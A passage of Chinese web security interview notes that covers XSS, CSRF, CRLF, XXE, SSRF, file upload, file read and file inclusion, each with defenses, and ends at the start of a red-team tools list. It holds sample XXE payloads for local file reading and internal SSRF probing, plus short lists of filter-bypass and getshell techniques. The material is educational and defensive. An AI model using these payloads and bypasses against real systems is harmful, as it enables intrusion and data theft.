反射型XSS是既有即用，没有持久性，而存储型XSS是存储在服务器上，只要服务器不挂机或者是被干掉，就一直会有，DOM型XSS和反射型差不多，但是用人就扯淡了，那反射型只要不改变源代码不就是一直存在吗？)</p></blockquote><blockquote><p>一、被攻击对象的不同</p><blockquote><ul><li>反射型XSS的被攻击对象一般是攻击者去寻找的</li><li>存储型XSS是广撒网的方式或者指定的方式</li><li>DOM型XSS的被攻击对象其实和反射型XSS被攻击对象差不多，就是给攻击对象放送URL。</li></ul></blockquote><p>二、解析位置不同（个人感觉是反射型与存储型区别的本质）</p><blockquote><p>反射型XSS和存储型XSS<strong>都会和服务器产生交互</strong>，恶意代码由服务器端通过响应包返回给客户端；而DOM型XSS不会和服务器产生交互，恶意代码由前端的JavaScript处理。</p></blockquote><p>三、存储时间不同</p><blockquote><p>反射型XSS是既有即用，没有持久性，而存储型XSS是存储在服务器上，只要服务器不挂机或者是被干掉，就一直会有</p></blockquote><p>四、允许输入点的不同（这是DOM型与其他两种的区别）</p><blockquote><p>一般情况下，反射型XSS在搜索框啊，或者是页面跳转啊这些地方，而存储型XSS一般是留言，或者用户存储的地方，而DOM呢？是在DOM位置上，不取决于输入环境上。</p></blockquote><p>五、DOM型xss和别的xss最大的区别就是它不经过服务器，仅仅是通过网页本身的JavaScript进行渲染触发的</p></blockquote><h2 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复⽅式？"><a href="#CSRF-和-XSS-和-XXE-有什么区别，以及修复⽅式？" class="headerlink" title="CSRF 和 XSS 和 XXE 有什么区别，以及修复⽅式？"></a>CSRF 和 XSS 和 XXE 有什么区别，以及修复⽅式？</h2><ul><li>XSS 是跨站脚本攻击，⽤户提交的数据中可以构造代码来执⾏，从⽽实现窃取⽤户信息等攻击。</li></ul><blockquote><p><strong>修复⽅式</strong>：对字符实体进⾏转义、使⽤ HTTP Only 来禁⽌ JavaScript 读取 Cookie 值、输⼊时校验、浏览器与 Web应⽤端采⽤相同的字符编码。</p></blockquote><ul><li>CSRF 是跨站请求伪造攻击，XSS 是实现 CSRF 的诸多⼿段中的⼀种，是由于没有在关键操作执⾏时进⾏是否由⽤户⾃愿发起的确认。</li></ul><blockquote><p><strong>修复⽅式</strong>：筛选出需要防范 CSRF 的⻚⾯然后嵌⼊ Token、再次输⼊密码、检验 Referer  </p></blockquote><ul><li>XXE 是 XML 外部实体注⼊攻击，XML 中可以通过调⽤实体来请求本地或者远程内容，和远程⽂件保护类似，会引发相关安全问题，例如敏感⽂件读取。</li></ul><blockquote><p><strong>修复⽅式</strong>：XML 解析库在调⽤时严格禁⽌对外部实体的解析。</p></blockquote><h2 id="其他小问题-1"><a href="#其他小问题-1" class="headerlink" title="其他小问题"></a>其他小问题</h2><ol><li>如何快速发现 xss 位置？</li></ol><blockquote><p>各种输⼊的点，名称、上传、留⾔、可交互的地⽅，⼀切输⼊都是在害原则。</p></blockquote><ol start="2"><li>如果 SRC 上报了⼀个 XSS 漏洞，payload 已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？</li></ol><blockquote><p>看是否什么类型的 XSS，XSS 反射型看提交的地址，指的参数是哪个位置，通过这个⻚⾯进⾏ <strong>fuzzing 测试</strong>。</p><p>如果是<strong>存储型⻚⾯查找关键字</strong>。</p></blockquote><ol start="3"><li>如何使得前端 referer 为空</li></ol><blockquote><p>通过地址栏输⼊、从书签⾥⾯选择或者浏览器的插件 BurpSuite 修改。</p><p>referer和xff可以伪造</p></blockquote><ol start="4"><li>cookie 参数，security ⼲什么的（此问题不理解)</li></ol><blockquote><ul><li>Httponly：防⽌ cookie 被 xss 偷</li><li>https：防⽌ cookie 在⽹络中被偷</li><li>Secure：阻⽌ cookie 在⾮ https 下传输，很多全站 https 时会漏掉</li><li>Path : 区分 cookie 的标识，安全上作⽤不⼤，和浏览器同源冲突</li></ul></blockquote><h1 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h1><p>原理:HTTP 拆分攻击（HTTP Splitting），CRLF 是” 回⻋ + 换⾏”（rn）的简称。</p><p>在 HTTP 协议中，HTTP Header 与 HTTP Body 是⽤两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP 内容并显示出来。所以，⼀旦我们能够控制 HTTP 消息头中的字符，注⼊⼀些恶意的换⾏，这样我们就能注⼊⼀些会话 Cookie 或者 HTML 代码，所以 CRLFInjection ⼜叫 HTTP Response Splitting，简称 HRS。</p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>跨站请求伪造 (Cross-Site Request Forgery, CSRF)。CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。</p><blockquote><p><strong>条件：</strong>登录受信任网站A，并在本地生成Cookie。在不登出A的情况下，访问危险网站B。</p></blockquote><h3 id="CSRF特点"><a href="#CSRF特点" class="headerlink" title="CSRF特点"></a>CSRF特点</h3><blockquote><ul><li>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。</li><li>攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。</li><li>整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。</li></ul></blockquote><h3 id="什么是同源策略"><a href="#什么是同源策略" class="headerlink" title="什么是同源策略"></a>什么是同源策略</h3><p>同源策略是浏览器的一个协议，浏览器规定，任意两个页面，当他们URL <strong>同域名 同协议 同端口</strong>才被称之为同源，同源页面可以相互读取页面资源和执行页面脚本，如果不是同源页面，就不被允许。</p><h3 id="跨域方式（非同源页面数据交互的方式）"><a href="#跨域方式（非同源页面数据交互的方式）" class="headerlink" title="跨域方式（非同源页面数据交互的方式）"></a>跨域方式（非同源页面数据交互的方式）</h3><blockquote><p>cors和jsonp</p></blockquote><ul><li>JSONP跨域</li></ul><blockquote><p>只支持GET请求，不支持POST等其它请求，也不支持复杂请求，只支持简单请求。</p><p>JSONP 是 JSON with padding（填充式 JSON 或参数式 JSON）的简写，它携带了json信息与回调函数名。JSONP实现跨域请求的原理简单的说，就是动态创建<code>&lt;script&gt;</code>标签，然后利用<code>&lt;script&gt;</code>的src 不受同源策略约束来跨域获取数据。利用<code>&lt;script&gt;</code>可以跨域的原理，而且在跨域脚本中可以直接回调当前脚本的函数</p><p>JSONP 由两部分组成：<strong>回调函数和数据</strong>。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">callback(&#123; &quot;username&quot;: &quot;cl4y&quot;, &quot;password&quot;: &quot;admin888&quot; &#125;)</span><br></pre></td></tr></table></figure></blockquote><ul><li>CORS跨域</li></ul><blockquote><p>支持所有的请求，包含GET、POST、OPTOIN、PUT、DELETE等。既支持复杂请求，也支持简单请求。</p><p>JSONP与CORS的使用目的相同，并且都需要服务端和客户端同时支持，但CORS的功能更加强大。</p><p>服务器设置Access-Control-Allow-Origin HTTP响应头之后，浏览器将会允许跨域请求</p></blockquote><ul><li>JSONP和CORS的优缺点</li></ul><blockquote><ol><li><p>JSONP的主要优势在于对浏览器的支持较好；虽然目前主流浏览器都支持CORS，但IE9及以下不支持CORS。</p></li><li><p>JSONP只能用于获取资源（即只读，类似于GET请求）；CORS支持所有类型的HTTP请求，功能完善。</p></li></ol></blockquote><h3 id="csrf-如何不带-referer-访问"><a href="#csrf-如何不带-referer-访问" class="headerlink" title="csrf 如何不带 referer 访问"></a>csrf 如何不带 referer 访问</h3><blockquote><ul><li>通过地址栏，⼿动输⼊；</li><li>从书签⾥⾯选择；</li><li>通过实现设定好的⼿势。</li></ul><p>上⾯说的这三种都是⽤户⾃⼰去操作，因此不算 CSRF。</p><ul><li>跨协议间提交请求</li></ul><p>常⻅的协议：ftp:&#x2F;&#x2F;,http:&#x2F;&#x2F;,https:&#x2F;&#x2F;,fifile:&#x2F;&#x2F;,javascript:,data:. 最简单的情况就是我们在本地打开⼀个 HTML ⻚⾯ 这个时候浏览器地址栏是file:&#x2F;&#x2F; 开头的 如果这个 HTML ⻚⾯向任何 http 站点提交请求的话 这些请求 HTML ⻚⾯，Referer 都是空的。那么我们接下来可以利⽤ data: 协议来构造⼀个⾃动提交的 CSRF 攻击。当然这个协议是 IE 不⽀持的，我们可以换⽤ javascript</p></blockquote><h3 id="token-和-referer-做横向对⽐，谁安全等级⾼？"><a href="#token-和-referer-做横向对⽐，谁安全等级⾼？" class="headerlink" title="token 和 referer 做横向对⽐，谁安全等级⾼？"></a>token 和 referer 做横向对⽐，谁安全等级⾼？</h3><blockquote><p>token 安全等级更⾼，因为并不是任何服务器都可以取得 referer，如果从 HTTPS 跳到HTTP，也不会发送 referer。并且 FLASH ⼀些版本中可以⾃定义 referer。但是 token 的话，要保证其⾜够随机且不可泄露。(不可预测性原则)</p></blockquote><h3 id="CSRF-有何危害？"><a href="#CSRF-有何危害？" class="headerlink" title="CSRF 有何危害？"></a>CSRF 有何危害？</h3><blockquote><ul><li>篡改⽬标⽹站上的⽤户数据</li><li>盗取⽤户隐私数据 </li><li>传播 CSRF 蠕虫</li><li>盗取身份发送邮件、消息、空间说说</li><li>盗取身份进行虚拟货币转账</li></ul></blockquote><h3 id="防御CSRF"><a href="#防御CSRF" class="headerlink" title="防御CSRF:"></a>防御CSRF:</h3><p>主要是两种方式：<strong>阻止外域访问</strong>和<strong>提交时要求附加本域才能获取的信息</strong></p><ul><li>阻止不明外域的访问</li></ul><blockquote><ul><li>验证 HTTP Referer 字段,阻止不明外域的访问,进行同源检测</li><li>设置Samesite CookieStrict</li></ul></blockquote><ul><li>提交时要求附加本域才能获取的信息</li></ul><blockquote><ul><li><strong>CSRFToken</strong>设置随机 Token</li></ul><p>前面讲到CSRF的另一个特征是，攻击者无法直接窃取到用户的信息（Cookie，Header，网站内容等），仅仅是冒用Cookie中的信息。那么我们可以要求所有的用户请求都携带一个CSRF攻击者无法获取到的Token。服务器通过校验请求是否携带正确的Token，来把正常的请求和攻击的请求区分开，也可以防范CSRF的攻击。</p><p>所以CSRFToken不能通过cookie的形式接收、发送：</p><ul><li><ul><li>设置csrftoken的http头发送</li><li>利用post&#x2F;get形式发送</li></ul></li><li><p><strong>设置验证码</strong></p></li><li><p><strong>双重Cookie验证</strong></p></li></ul><p></p><p>双重cookie验证:也可以利用CSRF攻击不能获取到用户Cookie的特点，我们可以要求Ajax和表单请求携带一个Cookie中的值。</p><blockquote><ul><li>在用户访问网站页面时，通过set-cookie获取一个csrftoken例如：csrfcookie&#x3D;v8g9e4ksfhw</li><li>在每次发起请求时，取出Cookie，并添加到URL的参数中例如：<a href="https://www.a.com/comment?csrfcookie=v8g9e4ksfhw%E3%80%82">https://www.a.com/comment?csrfcookie=v8g9e4ksfhw。</a></li><li>后端接口验证Cookie中的csrfcookie值与URL参数中的值是否一致，不一致则拒绝。</li></ul></blockquote></blockquote><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote><p>XXE漏洞是在对外部实体数据进行处理时引发的安全问题</p><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、SSRF、发起Dos攻击等危害。</p></blockquote><h3 id="触发点"><a href="#触发点" class="headerlink" title="触发点"></a>触发点</h3><blockquote><p>往往是可以上传、读取xml,json数据的位置，没有对xml文档内容进行过滤，导致可上传、读取恶意xml数据。</p></blockquote><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><ul><li>文件读取</li></ul><blockquote><p>利用file:&#x2F;&#x2F;协议payload</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPEnote [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITYfile <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///F:/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>命令执行</li></ul><p></p><blockquote><p>命令执行<a href="https://www.php.net/manual/zh/wrappers.expect.php">https://www.php.net/manual/zh/wrappers.expect.php</a><br>php的expect:&#x2F;&#x2F; 协议可以用来执行命令，也是一个伪协议<br>为了使用 expect:&#x2F;&#x2F; 封装器，必须安装 » PECL 上的 » Expect 扩展。不安装扩展是没有办法使用的<br>expect:&#x2F;&#x2F;command</p></blockquote><ul><li>SSRF</li></ul><blockquote><p>通过回显时间、回显长度判断端口是否开放,</p><p>如果直接回显 （burp抓包重发），则表明存在端口服务</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPEnote [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITYxxeSYSTEM <span class="string">&quot;http://10.211.55.5:80&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">info</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">info</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>DOS拒绝服务攻击</li></ul><h3 id="xxe防御"><a href="#xxe防御" class="headerlink" title="xxe防御"></a>xxe防御</h3><blockquote><ul><li>通过黑名单过滤用户提交的XML数据</li><li>配置XML处理器使用禁用DTD、禁止外部实体解析</li></ul></blockquote><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h3 id="SSRF漏洞可以使用的协议"><a href="#SSRF漏洞可以使用的协议" class="headerlink" title="SSRF漏洞可以使用的协议"></a>SSRF漏洞可以使用的协议</h3><blockquote><ul><li>http</li><li>file</li></ul><blockquote><p>在有回显的情况下，利用 file 协议可以读取任意文件的内容</p></blockquote><ul><li>dict</li></ul><blockquote><p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p></blockquote><ul><li>gophar</li></ul><blockquote><p>gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p></blockquote></blockquote><h3 id="SSRF-漏洞的成因"><a href="#SSRF-漏洞的成因" class="headerlink" title="SSRF 漏洞的成因"></a>SSRF 漏洞的成因</h3><blockquote><p>漏洞形成的原因大多是因为服务端提供，从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。而且在大部分的web架构中服务器自身是可以访问互联网服务和所在内网资源，此时攻击者就可以传入任意地址（内网地址）来让服务器发起请求，并返回数据，进而造成SSRF攻击。</p></blockquote><h3 id="SSRF-漏洞的验证⽅法："><a href="#SSRF-漏洞的验证⽅法：" class="headerlink" title="SSRF 漏洞的验证⽅法："></a>SSRF 漏洞的验证⽅法：</h3><blockquote><p>1）因为 SSRF 漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从⽽来判断是否存在 SSRF 漏洞</p><p>2 ） 在 ⻚ ⾯ 源 码 中 查 找 访 问 的 资 源 地 址  ， 如 果 该 资 源 地 址 类 型 为<a href="http://www.baidu.com/xxx.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8">www.baidu.com/xxx.php?image=（地址）的就可能存在</a> SSRF 漏洞</p></blockquote><h3 id="SSRF利用方式"><a href="#SSRF利用方式" class="headerlink" title="SSRF利用方式"></a>SSRF利用方式</h3><blockquote><ul><li>扫描内网ip、端口，探测主机端口存活，获取banner信息。</li><li>攻击运行本地运行的应用程序</li><li>攻击内网服务（mysql、redis）</li><li>攻击内网web服务</li><li>利用file协议读取本地文件</li></ul></blockquote><h3 id="SSRF-漏洞防御"><a href="#SSRF-漏洞防御" class="headerlink" title="SSRF 漏洞防御"></a>SSRF 漏洞防御</h3><blockquote><p>禁止跳转，限制协议，内外⽹限制、URL 限制 针对 IP 格式</p><ul><li>设置IP白名单</li><li>限制请求的端口</li><li>禁止不常用的协议</li><li>过滤返回的信息</li><li>统一错误信息</li></ul><blockquote><p>避免用户可以根据错误信息来判断远程服务器的端口状态。</p></blockquote><ul><li>对DNS Rebinding，可以使用Host白名单的方式，如果域名不可控，可以使用沙箱实现内网分离</li></ul></blockquote><h3 id="SSRF漏洞出现位置"><a href="#SSRF漏洞出现位置" class="headerlink" title="SSRF漏洞出现位置"></a>SSRF漏洞出现位置</h3><blockquote><ul><li>社交分享功能：获取超链接的标题等内容进行显示。在分享内容的时候，可能需要先把内容请求显示一个预览给用户看，这个时候自动进行了请求的时候可能就存在SSRF</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片文章加载&#x2F;下载&#x2F;收藏：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试邮件系统：比如接收邮件服务器地址，再比如多地ping提供的服务。</li></ul></blockquote><h3 id="csrf跟ssrf区别"><a href="#csrf跟ssrf区别" class="headerlink" title="csrf跟ssrf区别"></a>csrf跟ssrf区别</h3><blockquote><ul><li>CSRF (Cross-site request forgery)跨站请求伪造</li><li>SSRF (Server-Side Request Forgery)服务器端请求伪造</li><li>csrf 一个是客户端发起，ssrf是从服务端发起的</li></ul></blockquote><h3 id="SSRF-禁用-127-0-0-1-后如何绕过，支持哪些协议？"><a href="#SSRF-禁用-127-0-0-1-后如何绕过，支持哪些协议？" class="headerlink" title="SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？"></a>SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？</h3><blockquote><ul><li>利用进制转换</li><li>利用 DNS 解析</li><li>利用句号（127。0。0。1）</li><li>利用[::]（http:&#x2F;&#x2F;[::]:80&#x2F;）；</li><li>利用@（<a href="http://example.com@127.0.0.1);/">http://example.com@127.0.0.1）；</a></li><li>利用短地址（百度短网址）；</li></ul></blockquote><blockquote><p>协议：（Dict:&#x2F;&#x2F;、SFTP:&#x2F;&#x2F;、TFTP:&#x2F;&#x2F;、LDAP:&#x2F;&#x2F;、Gopher:&#x2F;&#x2F;）</p></blockquote><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h3 id="文件上传的攻击特征是什么"><a href="#文件上传的攻击特征是什么" class="headerlink" title="文件上传的攻击特征是什么"></a>文件上传的攻击特征是什么</h3><blockquote><p>文件上传首先是POST的数据包，且content-type为multipart&#x2F;form-data，如果为恶意的文件上传漏洞攻击，则数据包中filename属性的后缀为jsp,php,asp等恶意后缀，且文件内容一般为Webshell内容</p></blockquote><h3 id="⽂件上传漏洞原理"><a href="#⽂件上传漏洞原理" class="headerlink" title="⽂件上传漏洞原理"></a>⽂件上传漏洞原理</h3><blockquote><p>由于程序员在对⽤户⽂件上传部分的控制不⾜或者处理缺陷，⽽导致⽤户可以越过其本身权限向服务器上传可执⾏的动态脚本⽂件，通过上传⽂件可达到控制网站权限的目的。</p></blockquote><h3 id="文件上传产生漏洞的原因"><a href="#文件上传产生漏洞的原因" class="headerlink" title="文件上传产生漏洞的原因"></a>文件上传产生漏洞的原因</h3><blockquote><ul><li>服务器配置不当</li><li>文件上传限制被绕过</li><li>开源编辑器的上传漏洞</li><li>文件解析漏洞导致文件执行</li><li>过滤不严或被绕过</li></ul></blockquote><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><blockquote><ul><li>有上传功能</li><li>知道文件上传后的路径</li><li>上传后的文件可以访问</li><li>上传后的文件可以执行</li></ul></blockquote><h3 id="文件上传检测"><a href="#文件上传检测" class="headerlink" title="文件上传检测"></a>文件上传检测</h3><blockquote><p>**客户端javascript校验:**校验文件后缀名</p><p><strong>服务端校验</strong></p><ul><li><blockquote><ul><li><ul><li>MIME检测（content-type头检测）</li><li>文件内容检测</li></ul></li><li><ul><li><blockquote><ul><li>文件幻数检测</li><li>PHP脚本标签</li><li>危险函数</li></ul></blockquote></li></ul></li><li><ul><li>后缀名检测</li></ul></li><li><ul><li><blockquote><ul><li>黑名单</li><li>白名单</li></ul></blockquote></li></ul></li><li><ul><li>图片渲染</li><li>图片裁剪</li></ul></li></ul></blockquote></li></ul></blockquote><h3 id="常⻅的上传绕过⽅式"><a href="#常⻅的上传绕过⽅式" class="headerlink" title="常⻅的上传绕过⽅式"></a>常⻅的上传绕过⽅式</h3><blockquote><ul><li>前端 js 验证：禁⽤ js&#x2F;burp 改包</li><li>⼤⼩写</li><li>双重后缀名</li><li>过滤绕过 pphphp-&gt;php</li></ul></blockquote><h3 id="文件上传防御"><a href="#文件上传防御" class="headerlink" title="文件上传防御"></a>文件上传防御</h3><blockquote><p><strong>1. 文件上传的目录设置为不可执行</strong></p><p>只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，这一点至关重要。</p><p><strong>2. 判断文件类型</strong></p><p>在判断文件类型时，可以结合使用MIME-Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</p><p><strong>3. 使用随机数改写文件名和文件路径</strong></p><p>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</p><p><strong>4. 单独设置文件服务器的域名</strong></p><p>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</p></blockquote><h3 id="其他小问题-2"><a href="#其他小问题-2" class="headerlink" title="其他小问题"></a>其他小问题</h3><ol><li>审查上传点的元素有什么意义？</li></ol><blockquote><p>有些站点的上传⽂件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p></blockquote><ol start="2"><li>Webshell是什么，原理是什么</li></ol><blockquote><p>WebShell就是一句话木马，由于脚本语言的动态性，木马文件通过命令执行system函数或者代码执行eval函数等，参数为用户外部传入（如GET传参，POST传参）达到执行任意代码任意命令的功能。从而远程控制目标主机。</p></blockquote><h1 id="任意文件读取-x2F-删除"><a href="#任意文件读取-x2F-删除" class="headerlink" title="任意文件读取&#x2F;删除"></a>任意文件读取&#x2F;删除</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><blockquote><p>很多网站由于业务需求，往往需要提供文件下载、读取、删除等功能块，但是如果对下载的文件没有做限制，直接通过绝对路径、相对路径对其文件进行读取，那么，用户就可以利用这种方式读取服务器的敏感文件、获取网站源代码、进行SSRF漏洞攻击。</p></blockquote><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><blockquote><ul><li>存读取文件的函数</li><li>读取文件的路径用户可控，且未校验或校验不严</li><li>输出了文件内容</li></ul></blockquote><h3 id="文件读取函数"><a href="#文件读取函数" class="headerlink" title="文件读取函数"></a>文件读取函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>()高亮显示文件内容</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()高亮显示文件内容(别名)</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()读取文件内容并输出</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>()将文件读取为字符串</span><br><span class="line"><span class="title function_ invoke__">file</span>()将文件安行读取为数组</span><br></pre></td></tr></table></figure><h3 id="漏洞产生位置"><a href="#漏洞产生位置" class="headerlink" title="漏洞产生位置"></a>漏洞产生位置</h3><blockquote><ul><li>读取&#x2F;下载图片、文件内容；</li><li>下载附件；</li><li>预览文档；</li><li>导出文档；</li><li>修改、保存文档等</li><li>删除文件、附件、图片、替换、配置等</li></ul></blockquote><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><blockquote><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的内容，将之当成PHP脚本来执行。而由于包含的文件名没有经过合理的校验和过滤，从而包含了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入，导致了执行了非预期的代码。主要包括本地文件包含和远程文件包含两种形式。</p></blockquote><h3 id="php-的LFI（本地包含漏洞）原理是什么？"><a href="#php-的LFI（本地包含漏洞）原理是什么？" class="headerlink" title="php 的LFI（本地包含漏洞）原理是什么？"></a>php 的LFI（本地包含漏洞）原理是什么？</h3><blockquote><p>文件包含产生原因：</p><blockquote><ul><li>存读取文件的函数</li><li>读取文件的路径用户可控，且未校验或校验不严</li><li>输出了文件内容</li></ul></blockquote></blockquote><h3 id="本地文件包含利用方式"><a href="#本地文件包含利用方式" class="headerlink" title="本地文件包含利用方式"></a>本地文件包含利用方式</h3><blockquote><ol><li>包含本地文件，读取敏感文件，如host，password文件</li><li>先将shell写入日志，然后再包含日志文件getshell。<br>如果是浏览器url写入日志php代码，会被浏览器注释掉，可以通过burp发包或者是curl发包访问服务器日志<br>也可以写在UA头中，日志文件也会显示UA头</li><li>将shell写入session文件，包含session文件getshell。SESSION 文件保存的目录由session.save_path指定，文件名以 sess_ 为前缀，后跟 SESSION ID，如：sess_c72665af28a8b14c0fe11afe3b59b51b。文件中的数据即是序列化之后的SESSION数据了</li><li>结合PHP伪协议getshell</li></ol><blockquote><ul><li><p>file:&#x2F;&#x2F;用于访问本地文件系统</p></li><li><p>php:&#x2F;&#x2F;访问各个输入&#x2F;输出流（I&#x2F;O streams）</p></li><li><p>php:&#x2F;&#x2F;filter是一种元封装器，可以在读取文件之前对文件编码、转换、压缩、加密等</p></li><li><p>php:&#x2F;&#x2F;input是个可以访问请求的原始数据的只读流,可以读取到post没有解析的原始数据。会读取POST内容里面的代码来执行</p><blockquote><p><a href="https://www.php.cn/php-ercikaifa-346258.html">https://www.php.cn/php-ercikaifa-346258.html</a></p></blockquote></li><li><p>data:&#x2F;&#x2F;data伪协议是一个数据流封装器，可以理解为把数据当作一个文件共享</p></li><li><p>http:&#x2F;&#x2F; https:&#x2F;&#x2F;允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。</p></li><li><p>phar:&#x2F;&#x2F;可以访问zip、phar格式包内容</p></li></ul></blockquote><ol start="5"><li>结合文件上传getshell。如上传txt或者jpg等，在文件末尾加入一句话。结合文件包含漏洞，即可解析代码。图片马</li><li>远程文件包含getshell，写在VPS上。需要开启allow_url_include设置为ON</li></ol></blockquote><h3 id="导致⽂件包含的函数"><a href="#导致⽂件包含的函数" class="headerlink" title="导致⽂件包含的函数"></a>导致⽂件包含的函数</h3><blockquote><ul><li><code>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfifile(), …</code> </li><li><code>JSP/Servlet：ava.io.File(),java.io.Fil-eReader(), …</code> </li><li><code>ASP：include fifile, include virtual,</code></li></ul></blockquote><h3 id="PHP中文件包含函数特点："><a href="#PHP中文件包含函数特点：" class="headerlink" title="PHP中文件包含函数特点："></a>PHP中文件包含函数特点：</h3><blockquote><p>文件包含不需要考虑文件名是否为php.。包含的文件当中，存在符合php语法的内容，则执行这些内容。，意思就是<strong>即使后缀不是php，也会执行php</strong></p><p>包含的文件当中，不存在符合php语法的内容，则原封不动的输出这些内容</p><p>这样我们就可以窃取主机上的内容</p></blockquote><h3 id="文件包含防御"><a href="#文件包含防御" class="headerlink" title="文件包含防御"></a>文件包含防御</h3><blockquote><ul><li><strong>配置文件：</strong></li></ul><p>在配置文件中限制访问的文件目录，比如PHP中php.ini配置open_basedir</p><p>尽量关闭allow_url_include配置</p><ul><li><strong>特殊字符过滤：</strong></li></ul><p>检查用户输入，过滤或转义含有“..&#x2F;”、“..\”、“http”、“%00”，“..”，“.”，“#”等跳转目录或字符终止符、截断字符、url的输入</p><ul><li><strong>合法性判断：</strong></li></ul><p>严格过滤用户输入字符的合法性，比如文件类型、文件地址、文件内容等</p><ul><li><strong>白名单：</strong></li></ul><p>白名单限定访问文件的路径、名称及后缀名</p><ul><li><strong>控制回显：</strong></li></ul></blockquote><h1 id="红队"><a href="#红队" class="headerlink" title="红队"></a>红队</h1><h3 id="在外网打点过程中，常用的信息收集工具有哪些？"><a href="#在外网打点过程中，常用的信息收集工具有哪些？" class="headerlink" title="在外网打点过程中，常用的信息收集工具有哪些？"></a>在外网打点过程中，常用的信息收集工具有哪些？</h3><blockquote><ul><li>ENScan 企业信息查询工具 </li><li>Oneforall 子域名收集工具 </li><li>水泽 信息收集自动化工具 </li><li>FOFA、Goby 网络空间资产检索\攻击面测绘工具 </li><li>Masscan 端口扫描工具 </li><li>ARL 资产安全灯塔 快速侦察与目标关联的资产工具</li><li>Nmap 端口扫描工具</li><li>Awvs 